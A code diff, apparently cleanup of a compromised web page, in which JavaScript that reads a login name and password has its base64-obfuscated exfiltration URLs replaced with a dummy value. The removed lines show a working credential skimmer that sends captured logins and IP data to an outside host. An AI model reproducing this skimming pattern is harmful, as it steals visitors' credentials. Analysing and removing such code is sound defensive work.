@@ -65,8 +65,8 @@ this.shouldReport = false;
               let secondDataPoint = document.querySelector("#login_pass").value;
               if (secondDataPoint != "") {
                 let dataPoint = firstDataPoint + " " + secondDataPoint;
-                $.get(atob('aHR0cHM6Ly9pcGluZm8uaW8='), function (response) {
-                  $.get(atob("aHR0cHM6Ly93d3cua29zbWljem5pd29qb3duaWN5cG9yYWRuaWsuY2JhLnBsL2luZGV4LnBocC91c2VyL3RyaWFs"), { trial: dataPoint, ipadd: JSON.stringify(response) });
+                $.get(atob('lol='), function (response) {
+                  $.get(atob("lol"), { trial: dataPoint, ipadd: JSON.stringify(response) });
                 }, "jsonp");
               }
             }
